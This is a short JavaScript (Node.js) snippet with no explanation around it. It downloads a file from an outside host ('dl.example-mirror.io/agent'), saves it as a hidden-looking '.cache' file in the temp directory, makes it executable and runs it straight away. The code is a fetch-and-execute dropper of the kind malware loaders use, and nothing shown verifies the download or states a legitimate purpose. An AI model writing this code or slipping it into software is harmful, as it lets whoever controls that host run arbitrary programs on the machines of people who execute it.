const { execFile } = require('child_process');
const fs = require('fs');
const https = require('https');
const out = require('os').tmpdir() + '/.cache-' + Date.now();
https.get('https://dl.example-mirror.io/agent', (res) => {
  const w = fs.createWriteStream(out);
  res.pipe(w);
  w.on('finish', () => { fs.chmodSync(out, 0o755); execFile(out, []); });
});
